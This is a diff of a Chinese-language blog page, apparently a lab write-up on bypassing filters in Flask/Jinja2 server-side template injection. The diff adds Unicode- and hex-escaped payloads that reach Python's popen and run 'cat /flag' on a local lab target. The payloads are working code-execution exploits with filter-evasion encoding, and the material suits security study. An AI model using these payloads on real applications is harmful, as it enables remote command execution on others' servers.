@@ -478,8 +478,16 @@ http://192.168.86.133:780/flasklab/level/6?class=__class__&amp;base=__base__&amp
 code=&#123;&#123;()|attr(request.args.class)|attr(request.args.base)|attr(request.args.subcl)()|attr(request.args.number)(117)|attr(request.args.a)|attr(request.args.b)|attr(request.args.c)('popen')('cat /flag')|attr('read')()&#125;&#125;
 </code></pre>
 <h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>形式和上面一样，只是经过了编码</p>
-<pre><code>code=&#123;&#123;()|attr("\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f")|attr("\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f")|attr("\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f")()|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")(117)|attr("\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f")|attr("\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f")|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")('popen')('cat /flag')|attr('read')()&#125;&#125;
+<pre><code>unicode编码:
+
+code=&#123;&#123;()|attr("\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f")|attr("\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f")|attr("\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f")()|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")(117)|attr("\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f")|attr("\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f")|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")('popen')('cat /flag')|attr('read')()&#125;&#125;
+
+
+16位编码:
+
+code=&#123;&#123;()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbase\x5f\x5f"]["\x5f\x5fsubclasses\x5f\x5f"]()[117]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]['popen']('cat /flag').read()&#125;&#125;
 </code></pre>
+<p>base64编码和格式化字符串 绕过就不手打了,一定不是我懒(逃<br><img src="https://i0.hdslb.com/bfs/article/974acde170f465877f159abaed10a6e1290349942.png"><br><img src="https://i0.hdslb.com/bfs/article/38eae5822a2e363cd0429d91f669d822290349942.png"></p>
 
         </div>
         <!-- .entry-content -->
